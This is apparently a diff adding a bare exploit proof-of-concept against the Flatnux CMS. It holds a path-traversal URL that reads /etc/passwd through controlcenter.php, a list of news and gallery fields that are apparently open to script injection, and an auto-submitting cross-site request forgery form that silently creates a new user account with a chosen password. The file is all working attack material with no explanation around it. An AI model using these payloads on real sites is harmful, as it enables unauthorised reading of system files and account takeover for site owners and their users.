@@ -1,0 +1,29 @@
+1.1
+http://www.example.com/flatnux/controlcenter.php?opt=contents/Files&dir=%2Fetc&ffile=passwd&opmod=open
+
+
+1.2
+     the comment to the news
+     the title of the news
+     the name of the folders that admin creates in the gallery
+
+
+1.3
+<html>
+<form  name="test" 
+action="http://www.example.com/flatnux/controlcenter.php?page___xdb_fn_users=1&order___xdb_fn_users=username&desc___xdb_fn_users=&op___xdb_fn_users=insnew&page___
+xdb_fn_users=&op=editdata&opt=utilities/xmldb_admin&t=fn_users" method="post">
+<input type="hidden" name="username" value="csrf"><br/>
+<input type="hidden" name="email" value="csrf () hotmail com"><br/>
+<input type="hidden" name="passwd" value="186911"><br/>
+<input type="hidden" name="passwd_retype" value="186911"><br/>
+<input type="hidden" name="name" value="csrf"><br/>
+<input type="hidden" name="surname" value="Mr"><br/>
+<input type="hidden" name="link" value="http"><br/>
+<input type="hidden" name="avatarimage" value=""><br/>
+<input type="hidden" name="avatar" value=""><br/>
+<input type="hidden" name="save___xdb_fn_users" value="__xdb_fn_users"><br\>
+<input type="hidden" name="activ" value=1><br/>
+</form>
+<script>document.test.submit();</script>
+</html>
